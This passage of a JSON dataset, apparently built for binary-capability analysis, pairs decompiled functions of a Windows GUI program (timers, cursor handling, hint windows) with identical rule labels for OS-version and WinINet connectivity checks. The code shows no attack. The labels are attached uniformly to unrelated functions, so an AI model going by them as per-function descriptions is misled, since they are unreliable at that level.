        "decompiled_code": "\nuint __cdecl fcn.00445fe0(uchar *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint var_6h;\n    \n    uVar2 = 0;\n    *arg_8h = 1;\n    iVar3 = 0;\n    if (*(*0x497c18 + 100) != 0) {\n        iVar3 = fcn.0043b1a8();\n        if ((iVar3 != 0) && (*(iVar3 + 0x2f2) != 0)) {\n            uVar2 = (**(iVar3 + 0x2f0))(arg_8h);\n        }\n    }\n    if (uVar2 == '\\0') {\n        iVar1 = *(*0x497c18 + 0x68);\n        if ((((iVar1 != 0) && (iVar3 != iVar1)) && (iVar1 != 0)) && (*(iVar1 + 0x2f2) != 0)) {\n            uVar2 = (**(iVar1 + 0x2f0))(arg_8h);\n        }\n        if ((uVar2 == '\\0') && (*(in_EAX + 0x11a) != 0)) {\n            uVar2 = (**(in_EAX + 0x118))(arg_8h);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 322
    },
    "004460ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004460ac(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack28 = &fcn.004460ac::var_1h + 1;\n    uStack32 = 0x44612a;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    arg_8h = &fcn.004460ac::var_1h;\n    fcn.004058fc();\n    fcn.00445fe0(arg_8h);\n    if ((var_1h != '\\0') && (cVar1 = fcn.0044667c(),  cVar1 != '\\0')) {\n        fcn.00446fd8();\n        (**(**(in_EAX + 0x4c) + 0xc))();\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack32 = 0x446131;\n    iStack36 = 0x446129;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 308
    },
    "0044613c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0044613c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack28 = &fcn.0044613c::var_1h + 1;\n    uStack32 = 0x4461b3;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    arg_8h = &fcn.0044613c::var_1h;\n    fcn.00445fe0(arg_8h);\n    if ((var_1h != '\\0') && (cVar1 = fcn.0044667c(),  cVar1 != '\\0')) {\n        fcn.00446fd8();\n        (**(**(in_EAX + 0x4c) + 0x10))();\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack32 = 0x4461ba;\n    iStack36 = 0x4461b2;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 308
    },
    "004462a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004462a4(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    if (*0x497c14 != 0) {\n        uStack24 = 0x4462e9;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack28;\n        uVar1 = 0;\n        sub.user32.dll_KillTimer(0, *0x497c40);\n        *0x497c40 = 0;\n        fcn.0044621c();\n        *in_FS_OFFSET = uVar1;\n    }\n    return;\n}\n",
        "token_count": 165
    },
    "0044630c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044630c(void)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x446459;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x446336;\n    fcn.00446280();\n    if ((*(in_EAX + 0x88) != '\\0') && (*(in_EAX + 0x48) == 0)) {\n        puStack48 = 0x446355;\n        fcn.004468d4();\n    }\n    puStack48 = 0x44635f;\n    fcn.00443de8();\n    puStack48 = 0x44636a;\n    fcn.0044c9d8();\n    puStack48 = 0x446377;\n    fcn.00446504();\n    bVar1 = true;\n    uStack52 = 0x446400;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    if (*(in_EAX + 0x12a) != 0) {\n        puStack48 = &stack0xfffffffc;\n        (**(in_EAX + 0x128))();\n    }\n    if (*(in_EAX + 0xc0) < 1) {\n        fcn.0044621c();\n    }\n    else if ((*0x497c40 == 0) &&\n            (*0x497c40 = sub.user32.dll_SetTimer(0, 0, *(in_EAX + 0xc0), fcn.004462a4),  *0x497c40 == 0)) {\n        fcn.0044621c();\n    }\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x44641a;\n    iVar3 = sub.kernel32.dll_GetCurrentThreadId_1();\n    if (iVar3 == **0x492afc) {\n        puStack48 = 0x44642b;\n        cVar2 = fcn.0041f660();\n        if (cVar2 != '\\0') {\n            bVar1 = false;\n        }\n    }\n    if (bVar1) {\n        puStack48 = 0x44643e;\n        sub.user32.dll_WaitMessage();\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x446460;\n    uStack40 = 0x446458;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 656
    },
    "00446504": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00446504(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar in_ZF;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x446518;\n    fcn.00405894();\n    if (!in_ZF) {\n        puStack20 = 0x446524;\n        fcn.004054c0();\n        if (*(in_EAX + 0x122) == 0) {\n            puStack20 = 0x44654c;\n            fcn.00431074();\n            puStack20 = 0x446559;\n            fcn.00449e20();\n            uStack24 = 0x446589;\n            uStack28 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe4;\n            puStack20 = &stack0xfffffffc;\n            fcn.0040483c();\n            *in_FS_OFFSET = uStack28;\n            puStack20 = 0x446590;\n            uStack24 = 0x446588;\n            fcn.00404640();\n            return;\n        }\n        puStack20 = 0x44653c;\n        (**(in_EAX + 0x120))();\n    }\n    return;\n}\n",
        "token_count": 293
    },
    "004465f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004465f4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x30) != 0) {\n        iVar2 = fcn.0044321c();\n        if (-1 < iVar2 + -1) {\n            do {\n                iVar3 = fcn.00443208();\n                if (*(iVar3 + 0x57) != '\\0') {\n                    if ((*(iVar3 + 0x1c4) == 0) || (cVar1 = fcn.00457d34(),  cVar1 == '\\0')) {\ncode_r0x0044665b:\n                        fcn.00446598(&stack0xfffffffc);\n                        return;\n                    }\n                    fcn.00457a28(*(iVar3 + 0x1c4));\n                    iVar3 = sub.user32.dll_IsChild();\n                    if (iVar3 == 0) goto code_r0x0044665b;\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.00446598(&stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 279
    },
    "0044667c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0044667c(void)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = in_EAX;\n    if (*(in_EAX + 0x4c) == 0) {\n        fcn.004070f8();\n        uVar1 = fcn.0042cbb8();\n    }\n    return uVar1 & 0xffffff00 | *(in_EAX + 0x4c) != 0;\n}\n",
        "token_count": 110
    },
    "0044669c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044669c(uchar param_1, uint param_2)\n\n{\n    ushort uVar1;\n    int32_t in_EAX;\n    \n    fcn.004466e0();\n    uVar1 = sub.user32.dll_SetTimer(0, 0, param_2, fcn.00443e40);\n    *(in_EAX + 0x8a) = uVar1;\n    *(in_EAX + 0x89) = param_1;\n    if (*(in_EAX + 0x8a) == 0) {\n        fcn.004468d4();\n    }\n    return;\n}\n",
        "token_count": 142
    },
    "00446708": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00446708(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    bool bVar4;\n    uchar *puVar5;\n    int32_t iStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    uint uStack36;\n    int32_t iStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    uStack48 = *(param_1 + 8);\n    iStack44 = uStack48;\n    uStack48._2_2_ = uStack48 >> 0x10;\n    iStack40 = uStack48._2_2_;\n    uStack64 = 0x44673d;\n    fcn.0044f754();\n    uStack64 = 0x446748;\n    fcn.0044e23c();\n    uStack64 = 0x44674d;\n    iVar2 = fcn.00443e20();\n    if ((iVar2 == 0) || (*(iVar2 + 0x8d) == '\\0')) {\n        uStack64 = 0x446763;\n        fcn.004468d4();\n    }\n    else {\n        if (iVar2 == *(in_EAX + 0x60)) {\n            uStack36 = *(param_1 + 8);\n            iStack32 = uStack36;\n            uStack36._2_2_ = uStack36 >> 0x10;\n            iStack28 = uStack36._2_2_;\n            uStack64 = 0x446799;\n            fcn.0044f754();\n            uStack64 = uStack20;\n            uStack68 = uStack24;\n            iStack72 = in_EAX + 100;\n            iVar3 = sub.user32.dll_PtInRect();\n            bVar4 = iVar3 == 0;\n        }\n        else {\n            bVar4 = true;\n        }\n        puVar5 = &stack0xffffffb8;\n        if (bVar4) {\n            cVar1 = *(in_EAX + 0x58);\n            if (cVar1 == '\\0') {\n                iStack72 = *(in_EAX + 0x78);\n            }\n            else {\n                iStack72 = *(in_EAX + 0x80);\n            }\n            fcn.00450f7c(&stack0xffffffb8);\n            if ((cVar1 == '\\0') || (puVar5 != NULL)) {\n                fcn.004468d4();\n                *(in_EAX + 0x58) = cVar1;\n                *(in_EAX + 0x60) = iVar2;\n                fcn.0044669c();\n            }\n            else {\n                *(in_EAX + 0x58) = cVar1;\n                *(in_EAX + 0x60) = iVar2;\n                sub.user32.dll_GetCursorPos(&stack0xffffffb8);\n                fcn.00446b74();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 712
    },
    "004468d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004468d4(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x60) != 0) {\n        fcn.00446860();\n        *(in_EAX + 0x60) = 0;\n        *(in_EAX + 0x58) = 0;\n        fcn.00443fa8();\n        fcn.004466e0();\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "0044690c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0044690c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    int32_t iStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint *puStack64;\n    uint uStack60;\n    uint var_28h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uStack60 = 0xe;\n    puStack64 = 0x446920;\n    var_4h = (***0x492750)();\n    puStack64 = &fcn.0044690c::var_28h;\n    uStack68 = 0x44692c;\n    uStack68 = sub.user32.dll_GetCursor();\n    puStack72 = 0x446932;\n    iVar2 = sub.user32.dll_GetIconInfo();\n    if (iVar2 != 0) {\n        uStack76 = 0x446a50;\n        iStack80 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb0;\n        puStack84 = 0x446956;\n        puStack72 = &stack0xfffffffc;\n        fcn.00426180();\n        puStack84 = 0x446961;\n        iVar2 = fcn.00402ed8();\n        uStack88 = 0x446a21;\n        iStack92 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa4;\n        var_8h = iVar2 + var_8h;\n        puStack84 = &stack0xfffffffc;\n        var_10h = iVar2;\n        cVar1 = fcn.0042623c(var_8h);\n        if ((cVar1 != '\\0') && (*(var_10h + 0xe) == 1)) {\n            uVar3 = *(iVar2 + 4) * *(iVar2 + 0xe) + 0x1f & 0xffffffe0;\n            if (uVar3 < 0) {\n                uVar3 = uVar3 + 7;\n            }\n            var_14h = uVar3 >> 3;\n            var_4h = fcn.004468fc();\n            if ((var_4h == 0) && (SBORROW4(*(iVar2 + 8), *(iVar2 + 4) * 2) == *(iVar2 + 8) + *(iVar2 + 4) * -2 < 0)) {\n                var_4h = fcn.004468fc();\n            }\n            var_4h = var_4h / var_14h - var_20h;\n        }\n        *in_FS_OFFSET = var_8h;\n        uStack88 = 0x446a28;\n        iStack92 = 0x446a20;\n        iVar2 = fcn.00402f0c();\n        return iVar2;\n    }\n    return var_4h;\n}\n",
        "token_count": 723
    },
    "00446ac4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446ac4(uint arg_8h)\n\n{\n    char cVar1;\n    char *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x446b62;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    var_8h = 0;\n    if (in_EAX != NULL) {\n        while (*in_EAX != '\\0') {\n            while (((cVar1 = *in_EAX,  cVar1 != '\\0' && (cVar1 != '\\n')) && (cVar1 != '\\r'))) {\n                in_EAX = fcn.0040e6e4();\n            }\n            fcn.0040555c();\n            iVar2 = fcn.00424d1c();\n            if (var_8h < iVar2) {\n                var_8h = iVar2;\n            }\n            if (*in_EAX == '\\r') {\n                in_EAX = in_EAX + 1;\n            }\n            if (*in_EAX == '\\n') {\n                in_EAX = in_EAX + 1;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x446b69;\n    uStack32 = 0x446b61;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 358
    },
    "00446b74": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00446b74(uint param_1, uint *param_2)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uchar uVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    int32_t var_6dh;\n    int32_t var_65h;\n    char var_5dh;\n    uint lpPoint;\n    uint var_58h;\n    uint dx;\n    uint dy;\n    uint var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint lprc;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4ch = *param_2;\n    var_48h = param_2[1];\n    var_4h = in_EAX;\n    fcn.00405f08();\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff54;\n    *(var_4h + 0x58) = 0;\n    var_14h = 0;\n    if ((*(var_4h + 0x88) != '\\0') && (*(var_4h + 0x60) != 0)) {\n        fcn.004476dc();\n        cVar2 = fcn.0043af4c();\n        if (cVar2 != '\\0') {\n            fcn.0044e23c();\n            iVar4 = fcn.00443e20();\n            if (iVar4 == *(var_4h + 0x60)) {\n                var_44h = *(var_4h + 0x60);\n                var_3ch = var_4ch;\n                var_38h = var_48h;\n                iVar4 = fcn.0044690c();\n                var_38h = var_38h + iVar4;\n                var_34h = fcn.0044319c();\n                var_30h = *(var_4h + 0x5c);\n                fcn.0044f5e4();\n                (**(**(var_4h + 0x60) + 0x40))();\n                lpPoint = 0;\n                var_58h = 0;\n                piVar1 = *(*(var_4h + 0x60) + 0x30);\n                if (piVar1 == NULL) {\n                    iVar4 = *(var_4h + 0x60);\n                    cVar2 = fcn.004047cc();\n                    if ((cVar2 != '\\0') && (*(iVar4 + 0x1c4) != 0)) {\n                        sub.user32.dll_ClientToScreen();\n                    }\n                }\n                else {\n                    (**(*piVar1 + 0x40))();\n                }\n                sub.user32.dll_OffsetRect();\n                fcn.0044f804();\n                fcn.00443de8();\n                fcn.0044c994();\n                fcn.00405504();\n                var_10h = *(var_4h + 0x74);\n                var_40h = *0x4914e4;\n                var_8h = 0;\n                arg_8h = &var_44h;\n                iVar4 = fcn.00450f7c(arg_8h);\n                var_5dh = iVar4 == 0;\n                if ((var_5dh) && (*(var_4h + 0x15a) != 0)) {\n                    (**(var_4h + 0x158))(&var_44h);\n                }\n                if ((var_5dh == '\\0') || (*(var_4h + 0x60) == 0)) {\n                    uVar3 = 0;\n                }\n                else {\n                    uVar3 = 1;\n                }\n                *(var_4h + 0x58) = uVar3;\n                if ((*(var_4h + 0x58) != '\\0') && (var_ch != 0)) {\n                    fcn.00446a64(&stack0xfffffffc);\n                    (**(**(var_4h + 0x84) + 0x74))();\n                    (**(**(var_4h + 0x84) + 0xe8))(&var_6dh, var_8h);\n                    sub.user32.dll_OffsetRect(&var_6dh, var_3ch, var_38h);\n                    cVar2 = fcn.0040483c();\n                    if (cVar2 != '\\0') {\n                        iVar4 = fcn.00446ac4(&stack0xfffffffc);\n                        var_6dh = var_6dh - (iVar4 + 5);\n                        var_65h = var_65h - (iVar4 + 5);\n                    }\n                    fcn.0044f754();\n                    *(var_4h + 100) = var_88h;\n                    *(var_4h + 0x68) = var_84h;\n                    fcn.0044f754();\n                    *(var_4h + 0x6c) = var_88h;\n                    *(var_4h + 0x70) = var_84h;\n                    fcn.0044fe38();\n                    (**(**(var_4h + 0x84) + 0xe4))(var_8h);\n                    fcn.00443f34();\n                    if (var_14h < 1) {\n                        fcn.0044669c();\n                    }\n                    else {\n                        fcn.0044669c();\n                    }\n                    goto code_r0x00446ed6;\n                }\n            }\n        }\n    }\n    if (var_14h < 1) {\n        fcn.004468d4();\n    }\n    else {\n        fcn.0044669c();\n    }\ncode_r0x00446ed6:\n    *in_FS_OFFSET = arg_8h;\n    fcn.00405490();\n    fcn.00405fcc();\n    return;\n}\n",
        "token_count": 1443
    },
    "00446f10": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00446f10(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = 0;\n    while( true ) {\n        iVar1 = fcn.00406858(param_1);\n        if (iVar1 <= iVar2) break;\n        if (param_2 == *(*(in_EAX + 0xd0) + 4 + iVar2 * 0xc)) {\n            uVar3 = *(*(in_EAX + 0xd0) + iVar2 * 0xc);\n            goto code_r0x00446fce;\n        }\n        if (*(*(in_EAX + 0xd0) + iVar2 * 0xc) == -1) break;\n        iVar2 = iVar2 + 1;\n    }\n    uVar3 = *(in_EAX + 0xcc);\n    *(in_EAX + 0xcc) = *(in_EAX + 0xcc) + 1;\n    iVar1 = fcn.00406858();\n    if (iVar1 <= iVar2) {\n        iVar2 = fcn.00406858();\n        fcn.00406a14(iVar2 + 1);\n    }\n    *(*(in_EAX + 0xd0) + iVar2 * 0xc) = uVar3;\n    *(*(in_EAX + 0xd0) + 4 + iVar2 * 0xc) = param_2;\n    *(*(in_EAX + 0xd0) + 8 + iVar2 * 0xc) = *(param_2 + 0x344) != 0;\ncode_r0x00446fce:\n    return CONCAT44(uVar3, uVar3);\n}\n",
        "token_count": 395
    },
    "00446fd8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00446fd8(void)\n\n{\n    if ((*(*0x497c18 + 0x68) == 0) || (*(*(*0x497c18 + 0x68) + 0x284) == 0)) {\n        fcn.004054c0();\n    }\n    else {\n        fcn.004054c0();\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "00447014": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00447014(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0xf2) != 0) {\n        (**(in_EAX + 0xf0))();\n    }\n    iVar1 = sub.user32.dll_GetActiveWindow();\n    if (iVar1 == 0) {\n        sub.user32.dll_GetLastActivePopup(*(in_EAX + 0x30));\n    }\n    return CONCAT44(iVar1, iVar1);\n}\n",
        "token_count": 114
    },
    "0044705c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0044705c(void)\n\n{\n    int32_t in_EAX;\n    uint uStack8;\n    \n    uStack8 = 0;\n    if (*(in_EAX + 0xfa) != 0) {\n        (**(in_EAX + 0xf8))();\n    }\n    if (*(in_EAX + 0x44) != 0) {\n        uStack8 = fcn.00457a28();\n    }\n    return CONCAT44(uStack8, uStack8);\n}\n",
        "token_count": 111
    },
    "0044709c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.0044709c(int32_t param_1, uint32_t param_2)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uStack24;\n    \n    iVar4 = *(*0x497c18 + 0x68);\n    if (iVar4 == 0) {\ncode_r0x004470c7:\n        if ((iVar4 != *(in_EAX + 0x44)) && (*(in_EAX + 0x44) != 0)) {\n            iVar4 = fcn.00450f7c(param_1);\n            if (iVar4 == 1) goto code_r0x004470e7;\n        }\n        uVar1 = 0;\n    }\n    else {\n        iVar3 = fcn.00450f7c(param_1);\n        if (iVar3 != 1) goto code_r0x004470c7;\ncode_r0x004470e7:\n        uVar1 = 1;\n    }\n    uStack24 = param_2 & 0xffffff00 | uVar1;\n    if (uVar1 == 0) {\n        cVar2 = fcn.004047cc();\n        if ((((cVar2 != '\\0') && (*(param_1 + 0x6a) != '\\0')) && (*(param_1 + 0x60) != '\\0')) &&\n           ((*(param_1 + 0x1c) & 0x10) == 0)) {\n            fcn.00449ce4();\n        }\n    }\n    return CONCAT44(uStack24, uStack24) & 0xffffffff000000ff;\n}\n",
        "token_count": 385
    },
    "00447134": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00447134(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xda) != 0) {\n        (**(in_EAX + 0xd8))();\n    }\n    return 0;\n}\n",
        "token_count": 57
    },
    "0044715c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0044715c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xe2) != 0) {\n        (**(in_EAX + 0xe0))();\n    }\n    return 0;\n}\n",
        "token_count": 59
    },
    "00447320": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00447320(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    cVar1 = fcn.0042ef38();\n    if ((cVar1 == '\\0') || (cVar1 = fcn.00457d34(),  cVar1 == '\\0')) {\n        if ((*(in_EAX + 7) & 0x10) != 0) {\n            uVar3 = fcn.00457a28(0, 0xffffffff);\n            sub.user32.dll_InvalidateRect(uVar3);\n        }\n    }\n    else {\n        iVar2 = fcn.0044726c();\n        if (*(iVar2 + 8) == '\\0') {\n            fcn.00403aac();\n        }\n        if ((*(in_EAX + 7) & 0x10) == 0) {\n            fcn.00457a28();\n            fcn.0042ee0c();\n            (**(*in_EAX + 0x80))();\n        }\n        else {\n            uVar3 = fcn.00457a28(0, 0xffffffff);\n            sub.user32.dll_InvalidateRect(uVar3);\n        }\n    }\n    return;\n}\n",
        "token_count": 280
    },
    "00447558": {
        "rules": [
